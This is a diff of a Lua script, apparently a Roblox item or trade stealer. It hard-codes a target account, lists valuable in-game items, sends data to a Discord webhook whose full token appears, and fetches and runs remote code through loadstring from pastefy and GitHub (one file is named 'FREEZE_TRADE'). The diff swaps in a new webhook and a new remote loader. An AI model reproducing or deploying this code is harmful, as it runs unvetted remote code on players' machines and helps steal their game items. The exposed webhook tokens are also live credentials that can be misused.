@@ -1,6 +1,6 @@
 local TARGET_ID = 12019157130
 local TARGET_USER = "mvpnotop999"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572869469221552240/xjIaSbW6fti88uNGzs6dDda6vUBrFSnUH0BhDvOfmhMcLexkIgFdg1IaGV9QQdTpXn7Y"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1574586439889326130/cBSqq7FZPgHVdRr8Z-0t2PbdHU8sGpswpa6cU3-BPBATx6APAuaKjCZ3gaXTOAqvyNXl"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -355,9 +355,9 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
 
-task.wait(1)
+    task.wait(1)
 
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
